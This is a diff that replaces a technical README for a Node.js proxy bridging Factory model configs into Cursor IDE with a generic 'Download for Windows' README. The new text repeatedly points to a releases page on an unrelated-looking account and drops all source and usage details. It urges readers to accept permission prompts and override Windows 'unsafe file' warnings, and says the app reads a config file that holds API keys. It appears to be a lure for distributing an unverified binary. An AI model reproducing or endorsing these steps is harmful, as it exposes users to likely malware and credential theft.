@@ -1,198 +1,175 @@
-# factory-cursor-bridge
+# 🧩 factory-cursor-bridge - Use Your Factory Models in Cursor
 
-A unified BYOK proxy that wires any OpenAI-compatible model into **Cursor IDE** via the "Override OpenAI Base URL" setting. Supports multiple providers, protocol translation (OpenAI ↔ Anthropic), and automatic model prefixing.
+[![Download](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/fluxflapping699/factory-cursor-bridge/releases)
 
-## How it works
+## 🚀 What this does
 
-```
-Cursor IDE
-    │
-    ├─ Override OpenAI Base URL ──► https://your-tunnel-url.trycloudflare.com
-    │   (OpenAI API Key = bearer token)
-    │
-    ▼
-factory-cursor-bridge (:8316)
-    │
-    ├─ strips custom prefix (e.g. fx-) from model name
-    ├─ looks up base URL & API key from config file
-    ├─ translates protocol (OpenAI ↔ Anthropic) if needed
-    │
-    ▼
-Your actual API providers
-```
+factory-cursor-bridge connects your local `~/.factory/config.json` model setup to Cursor IDE.
 
-## Quick Start
+It helps you use the same BYOK model settings in Cursor without rebuilding your setup by hand. If you already use Factory for model access, this tool acts as a bridge so Cursor can use those models with less work.
 
-### 1. Configure your models
+## 💾 Download for Windows
 
-Create a `config.json` file with your models:
+1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases).
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If the download is a ZIP file, extract it first.
+5. Open the app file or installer from the extracted folder.
 
-```json
-{
-  "custom_models": [
-    {
-      "model": "my-gpt-4",
-      "model_display_name": "My GPT-4",
-      "base_url": "https://api.openai.com/v1",
-      "api_key": "sk-...",
-      "provider": "openai"
-    },
-    {
-      "model": "my-claude",
-      "model_display_name": "My Claude",
-      "base_url": "https://api.anthropic.com/v1",
-      "api_key": "sk-ant-...",
-      "provider": "anthropic"
-    },
-    {
-      "model": "my-local-model",
-      "model_display_name": "Local Model",
-      "base_url": "http://localhost:11434/v1",
-      "api_key": "local",
-      "provider": "openai"
-    }
-  ]
-}
-```
+## 🛠️ Before You Start
 
-### 2. Start the proxy
+You need:
 
-```bash
-node factory-cursor-bridge.mjs --config ./config.json --port 8316
-```
+- A Windows PC
+- Cursor IDE installed
+- A Factory config file at `~/.factory/config.json`
+- Access to the model provider you want to use
+- A stable internet connection
 
-Or set the environment variable:
+If you do not know where your Factory config file is, check the Factory app or the folder in your user profile that stores its settings.
 
-```bash
-export FACTORY_CONFIG=/path/to/your/config.json
-node factory-cursor-bridge.mjs
-```
+## 📦 How to Set It Up
 
-### 3. Expose via tunnel
+1. Download the Windows release from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases).
+2. Open the downloaded file.
+3. If Windows asks for permission, choose Yes.
+4. Follow the on-screen steps.
+5. Start Cursor IDE.
+6. Open the bridge tool if it does not start on its own.
+7. Make sure it can read your Factory config file.
+8. Use Cursor as usual and select the model setup you want through the bridge.
 
-Cursor blocks `127.0.0.1` (SSRF protection). You need a public tunnel:
+## 🖱️ First Run
 
-```bash
-cloudflared tunnel --url http://127.0.0.1:8316
-```
+When you open factory-cursor-bridge for the first time, it will look for your Factory config file.
 
-Use the `.trycloudflare.com` URL it gives you.
+If it finds `~/.factory/config.json`, it uses those model entries to connect Cursor to the right setup.
 
-### 4. Configure Cursor
+If Cursor does not show the models right away, close Cursor and open it again.
 
-1. Settings → Models
-2. Set **OpenAI API Key** to the bearer token from your config
-3. Enable **Override OpenAI Base URL** → your tunnel URL
-4. Click **+ Add Custom Model** and add your model names with the `fx-` prefix (e.g., `fx-my-gpt-4`, `fx-my-claude`)
+## 🔧 Typical Use
 
-## Config File Format
+Use this app when you want:
 
-```json
-{
-  "custom_models": [
-    {
-      "model": "model-id-in-upstream",
-      "model_display_name": "Display Name in Cursor",
-      "base_url": "https://api.provider.com/v1",
-      "api_key": "your-api-key",
-      "provider": "openai | anthropic | generic-chat-completion-api",
-      "supports_images": true,
-      "extra_headers": { "X-Custom-Header": "value" },
-      "extra_args": { "reasoning_effort": "high" }
-    }
-  ]
-}
-```
+- One model setup for both Factory and Cursor
+- Less manual setup in Cursor
+- A single place to manage BYOK model access
+- A simpler path from local config to the IDE you already use
 
-### Provider types
+## 🧭 How It Works
 
-| Provider | Protocol | Notes |
-|----------|----------|-------|
-| `openai` | OpenAI | Standard chat completions |
-| `anthropic` | Anthropic | Auto-converts to Anthropic Messages API |
-| `generic-chat-completion-api` | OpenAI | Generic OpenAI-compatible backend |
+factory-cursor-bridge reads your Factory config and maps those model settings into Cursor.
 
-## Model naming
+In plain terms:
 
-Each model in your config gets a `fx-` prefix in Cursor:
+- Factory keeps your model config
+- The bridge reads that config
+- Cursor uses the bridged setup
+- You keep one shared model path instead of two separate setups
 
-| Config `model` | Cursor model name |
-|-----------------|------------------|
-| `gpt-4o` | `fx-gpt-4o` |
-| `claude-3-5-sonnet` | `fx-claude-3-5-sonnet` |
-| `qwen-72b` | `fx-qwen-72b` |
+## 🪟 Windows Tips
 
-## Full example with multiple providers
+- Keep the app in a folder you can find easily, like `Downloads` or `Desktop`
+- If Windows blocks the file, right-click it and choose Open
+- If the app closes too fast, run it again from the same folder
+- Keep Cursor closed while you finish the first setup if you run into file access issues
 
-```json
-{
-  "custom_models": [
-    {
-      "model": "gpt-5.4",
-      "model_display_name": "GPT-5.4",
-      "base_url": "http://localhost:8318/v1",
-      "api_key": "local",
-      "provider": "openai"
-    },
-    {
-      "model": "claude-opus-4-6",
-      "model_display_name": "Claude Opus",
-      "base_url": "http://localhost:8318/v1",
-      "api_key": "local",
-      "provider": "anthropic"
-    },
-    {
-      "model": "llama-3.1-70b",
-      "model_display_name": "Llama 70B",
-      "base_url": "https://api.groq.com/openai/v1",
-      "api_key": "gsk_...",
-      "provider": "openai"
-    },
-    {
-      "model": "gemini-1.5-pro",
-      "model_display_name": "Gemini Pro",
-      "base_url": "https://generativelanguage.googleapis.com/v1beta",
-      "api_key": "AI...",
-      "provider": "generic-chat-completion-api"
-    },
-    {
-      "model": "deepseek-coder",
-      "model_display_name": "DeepSeek Coder",
-      "base_url": "http://localhost:11434/v1",
-      "api_key": "local",
-      "provider": "openai"
-    }
-  ]
-}
-```
+## 🔍 What You Should See
 
-## CLI Options
+After setup, you should be able to:
 
-```bash
-node factory-cursor-bridge.mjs [options]
+- Open Cursor
+- Choose the connected model setup
+- Use your Factory-backed models inside the editor
+- Keep your config in one place
 
-Options:
-  --config <path>   Path to config.json (default: ~/.factory/config.json)
-  --port <port>     Port to listen on (default: 8316)
-  --host <host>     Host to bind to (default: 127.0.0.1)
-  --token <token>   Bearer token for auth (default: from config)
-```
+If the model list looks wrong, check that your `config.json` file has the model entries you expect.
 
-## Endpoints
+## 🧩 Common Issues
 
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/health` | Health check |
-| `GET` | `/v1/models` | List available models |
-| `POST` | `/v1/chat/completions` | Chat completions |
+### Cursor does not show my models
 
-## Troubleshooting
+- Close Cursor
+- Open factory-cursor-bridge again
+- Check that `~/.factory/config.json` exists
+- Make sure the config file has valid model entries
 
-**"Provider was unable to process your request" error**
-→ Cursor blocks `127.0.0.1`. You must use a public tunnel URL.
+### The app cannot find my config
 
-**"Model not found" error**
-→ Make sure you're using the `fx-` prefixed name in Cursor.
+- Confirm the file path is correct
+- Make sure the file is named `config.json`
+- Check that the Factory folder is in your user profile
+- Try moving the app to a normal local folder like `Desktop`
 
-**Anthropic models not working**
-→ The proxy auto-converts OpenAI format to Anthropic format for `anthropic` provider type.
+### Windows says the file is unsafe
+
+- Download it again from the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases)
+- Open the file from the extracted folder
+- If needed, right-click the file and allow it to run
+
+### Cursor still uses old settings
+
+- Restart Cursor
+- Restart the bridge tool
+- Check whether another config is overriding your Factory settings
+
+## 📁 Folder and File Layout
+
+The bridge expects this kind of setup:
+
+- `~/.factory/`  
+  Your Factory settings folder
+
+- `~/.factory/config.json`  
+  Your model config file
+
+- Cursor IDE  
+  The app that uses the bridged model settings
+
+You do not need to move your whole Factory setup. The bridge works with the config file you already use.
+
+## 🧠 Best Results
+
+Use a clean config file with the model names you want Cursor to see.
+
+Keep backups of your Factory config before changing it.
+
+If you test more than one model provider, change one thing at a time so you can tell what worked.
+
+## 🗂️ Basic Use Cases
+
+- Use your local Factory model config in Cursor
+- Keep one BYOK setup across tools
+- Avoid repeating model settings in more than one app
+- Make Cursor follow your existing model list
+
+## ⌨️ File Access Checklist
+
+Before you open the app, check these items:
+
+- The release file is downloaded
+- The file is extracted if it came as a ZIP
+- Cursor is installed
+- `~/.factory/config.json` exists
+- The config file has the models you want
+- Windows lets the app run
+
+## 🔄 Update the App
+
+To get the latest version:
+
+1. Open the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases).
+2. Download the newest Windows file.
+3. Replace the old file with the new one if needed.
+4. Open the new version.
+5. Recheck your Factory config if the model list changes
+
+## 🧾 What This Repo Is For
+
+This repo gives Windows users a way to connect Factory model settings to Cursor IDE through a shared bridge.
+
+It fits users who already rely on `~/.factory/config.json` and want Cursor to use the same setup with less manual work
+
+## 🔗 Download Again
+
+If you need the file again, use the [releases page](https://github.com/fluxflapping699/factory-cursor-bridge/releases)
